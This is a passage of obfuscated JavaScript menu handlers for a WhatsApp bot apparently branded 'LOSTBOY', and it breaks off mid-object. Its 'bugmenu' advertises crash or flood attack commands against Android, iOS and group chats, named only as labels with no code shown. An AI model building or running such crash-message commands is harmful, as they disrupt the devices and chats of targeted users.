          const _0x4b682a = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᗩᒪᒪᗰᗴᑎᑌ \n\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄\n> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄\n> 𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄.\n> 𝙼𝙴𝙽𝚄2\n> 𝙱𝚄𝙶𝙼𝙴𝙽𝚄2\n> 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 2\n> 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄2\n> 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄2\n> 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄2\n> 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄2\n> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙽𝚄2\n> 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄2\n> 𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄2";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': 'https://files.catbox.moe/8x33pv.jpg'
            },
            'caption': _0x4b682a,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY"
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "ownermenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '👻',
              'key': _0x5f530e.key
            }
          });
          const _0x1202c8 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n Oᗯᑎᗴᖇ ᗰᗴᑎᑌ \n\n> 𝙶𝙴𝚃𝚂𝙴𝚂𝚂𝙸𝙾𝙽\n> 𝙳𝙴𝙻𝙴𝚃𝙴𝚂𝙴𝚂𝚂𝙸𝙾𝙽\n> 𝙹𝙾𝙸𝙽\n> 𝚂𝙷𝚄𝚃𝙳𝙾𝚆𝙽\n> 𝚁𝙴𝚂𝚃𝙰𝚁𝚃\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙰𝙳 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚃𝚈𝙿𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝚃𝚈𝙿 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝙱𝙸𝙾 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚂𝚃𝙰𝚃𝚄𝚂𝚅𝙸𝙴𝚆 𝙾𝙽/𝙾𝙵𝙵\n> 𝙼𝙾𝙳𝙴 𝙿𝚄𝙱𝙻𝙸𝙲/𝚂𝙴𝙻𝙵\n> 𝙱𝙻𝙾𝙲𝙺\n> 𝚄𝙽𝙱𝙻𝙾𝙲𝙺\n> 𝙱𝙰𝙲𝙺𝚄𝙿\n> 𝙶𝙴𝚃𝙲𝙰𝚂𝙴\n> 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁\n> 𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ ";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/8x33pv.jpg"
            },
            'caption': _0x1202c8,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "mainmenu",
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': '𝙱𝚄𝙶𝙼𝙴𝙽𝚄'
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "bugmenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💀',
              'key': _0x5f530e.key
            }
          });
          const _0xd29225 = " ᗷᑌᘜ ᗰᗴᑎᑌ \n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n\n ᗩᑎᗪᖇOIᗪ \n \n> 𝙻𝙾𝚂𝚃𝙱𝙾𝚈𝙷𝙸𝚃\n> 𝙻𝙾𝚁𝙳\n> 𝙲𝚂𝚄𝙸𝚃𝚂𝙷𝙾𝚃\n> 𝙿𝟷\n> 𝚃𝙰𝙲𝙺𝙻𝙴\n> 𝙻𝙰𝚅𝙰\n> 𝙿𝙴𝙽𝙴𝚃𝚁𝙰𝚃𝙴\n\n IOՏ \n \n> 𝙵𝙻𝙾𝙾𝙳𝙴𝙳\n\n ᘜᑕ \n \n> 𝙳𝙶𝙲";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/8x33pv.jpg"
            },
            'caption': _0xd29225,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "ownermenu",
              'buttonText': {
                'displayText': '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'downloadmenu',
              'buttonText': {
                'displayText': '𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': "𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'mainmenu',
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'Funmenu',
              'buttonText': {
                'displayText': '𝙵𝚄𝙽𝙼𝙴𝙽𝚄'
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case 'funmenu':
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '😈',
              'key': _0x5f530e.key
            }
          });
          const _0x1704f9 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᖴᑌᑎ ᗰᗴᑎᑌ \n \n> 𝙲𝙴𝙲𝙰𝙽-𝙸𝙽𝙳𝙾\n> 𝙴𝙽𝙲𝙾𝙳𝙴\n> 𝚂𝚂\n> 𝙴𝙽𝙲𝚁𝚈𝙿𝚃\n> 𝚁𝙿𝚂\n> 𝚅𝚅\n> 𝚅𝚅𝟸\n";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/s7huhm.jpg"
            },
            'caption': _0x1704f9,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': 'cecan-indo',
              'buttonText': {
                'displayText': "𝙲𝙴𝙲𝙰𝙽 𝙸𝙽𝙳𝙾"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'databasemenu',
              'buttonText': {
                'displayText': '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "mainmenu",
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'Funmenu',
              'buttonText': {
                'displayText': "𝙵𝚄𝙽𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': '1203233549551004@newsletter',
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "databasemenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '😲',
              'key': _0x5f530e.key
            }
          });
          const _0x57bb99 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᗪᗩTᗩᗷᗩՏᗴ ᗰᗴᑎᑌ \n \n> 𝙰𝙳𝙳𝚅𝙸𝙳𝙴𝙾\n> 𝙰𝙳𝙳𝙸𝙼𝙰𝙶𝙴\n> 𝙰𝙳𝙳𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙰𝙳𝙳𝚅𝙽\n> 𝙰𝙳𝙳𝚉𝙸𝙿\n> 𝙰𝙳𝙳𝙰𝙿𝙺\n> 𝙰𝙳𝙳𝙿𝙳𝙵\n> 𝙳𝙴𝙻𝚅𝙸𝙳𝙴𝙾\n> 𝙳𝙴𝙻𝙸𝙼𝙰𝙶𝙴\n> 𝙳𝙴𝙻𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙳𝙴𝙻𝚅𝙽\n> 𝙳𝙴𝙻𝚉𝙸𝙿\n> 𝙳𝙴𝙻𝙰𝙿𝙺\n> 𝙳𝙴𝙻𝙿𝙳𝙵\n> 𝙻𝙸𝚂𝚃𝚅𝙸𝙳𝙴𝙾\n> 𝙻𝙸𝚂𝚃𝙸𝙼𝙰𝙶𝙴\n> 𝙻𝙸𝚂𝚃𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙻𝙸𝚂𝚃𝚅𝙽\n> 𝙻𝙸𝚂𝚃𝚉𝙸𝙿\n> 𝙻𝙸𝚂𝚃𝙰𝙿𝙺\n> 𝙻𝙸𝚂𝚃𝙿𝙳𝙵";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/s7huhm.jpg"
            },
            'caption': _0x57bb99,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': 'ownermenu',
              'buttonText': {
                'displayText': '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': "𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "mainmenu",
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "Funmenu",
              'buttonText': {
                'displayText': "𝙵𝚄𝙽𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "downloadmenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '🥶',
              'key': _0x5f530e.key
            }
          });
          const _0x32bc2d = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : 'Free') + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\nᗪOᗯᑎᒪOᗩᗪ ᗰᗴᑎᑌ\n\n> 𝙶𝙸𝚃\n> 𝙶𝙸𝚃𝙲𝙻𝙾𝙽𝙴\n> 𝙿𝙻𝙰𝚈\n> 𝚈𝚃𝙼𝙿𝟹\n> 𝚈𝚃𝙼𝙿𝟺\n> 𝚂𝙾𝚄𝙽𝙳 𝟷 - 𝚂𝙾𝚄𝙽𝙳𝟷𝟼𝟷\n";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/s7huhm.jpg"
            },
            'caption': _0x32bc2d,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "ownermenu",
              'buttonText': {
                'displayText': "𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': "𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "mainmenu",
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': '𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "Funmenu",
              'buttonText': {
                'displayText': '𝙵𝚄𝙽𝙼𝙴𝙽𝚄'
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "convertmenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '🤤',
              'key': _0x5f530e.key
            }
          });
          const _0x2b0ca4 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᑕOᑎᐯᗴᖇT ᗰᗴᑎᑌ\n \n> 𝚂𝚃𝙸𝙺𝙴𝚁\n> 𝚂𝙼𝙴𝙼𝙴\n> 𝚃𝙾𝙸𝙼𝙰𝙶𝙴\n> 𝚃𝙾𝚅𝙸𝙳𝙴𝙾\n> 𝚃𝙾𝙰𝚄𝙳𝙸𝙾\n> 𝚃𝙾𝙼𝙿𝟹\n> 𝚃𝙾𝚅𝙽\n> 𝚃𝙾𝙶𝙸𝙵\n> 𝚃𝙾𝚄𝚁𝙻\n> 𝚃𝙾𝚀𝚁\n> 𝚃𝙾𝚅𝙸𝙴𝚆𝙾𝙽𝙲𝙴\n> 𝙵𝙻𝙸𝙿𝚃𝙴𝚇𝚃\n> 𝙴𝙼𝙾𝙹𝙸𝙼𝙸𝚇";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': 'https://files.catbox.moe/s7huhm.jpg'
            },
            'caption': _0x2b0ca4,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "ownermenu",
              'buttonText': {
                'displayText': "𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': "𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'animemenu',
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'mainmenu',
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'Funmenu',
              'buttonText': {
                'displayText': '𝙵𝚄𝙽𝙼𝙴𝙽𝚄'
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case 'cpanelmenu':
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '😇',
              'key': _0x5f530e.key
            }
          });
          const _0x306c54 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : 'Free') + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᑕᑭᗩᑎᗴᒪ ᗰᗴᑎᑌ\n \n> 𝙻𝙸𝚂𝚃𝚁𝙰𝙼\n> 𝙻𝙸𝚂𝚃𝚂𝚁𝚅\n> 𝙰𝙳𝙳𝙿𝚁𝙴𝙼\n> 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄\n> 𝙿𝙰𝚈\n> 𝙾𝚆𝙽𝙴𝚁";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': 'https://files.catbox.moe/s7huhm.jpg'
            },
            'caption': _0x306c54,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': 'listram',
              'buttonText': {
                'displayText': '𝙻𝙸𝚂𝚃𝚁𝙰𝙼'
              }
            }, {
              'buttonId': "listsrv",
              'buttonText': {
                'displayText': "𝙻𝙸𝚂𝚃𝚂𝚁𝚅"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': "𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
